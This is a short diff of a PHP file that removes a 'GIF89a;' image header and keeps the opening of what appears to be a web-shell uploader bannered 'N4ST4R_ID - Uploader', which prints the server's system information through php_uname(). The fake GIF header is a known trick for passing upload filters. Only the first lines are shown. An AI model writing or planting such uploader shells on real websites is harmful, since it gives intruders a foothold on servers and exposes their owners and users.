@@ -1,4 +1,3 @@
-GIF89a;
 <?php
 echo "<b>N4ST4R_ID - Uploader</b>";
 echo "<br>".php_uname()."<br>";
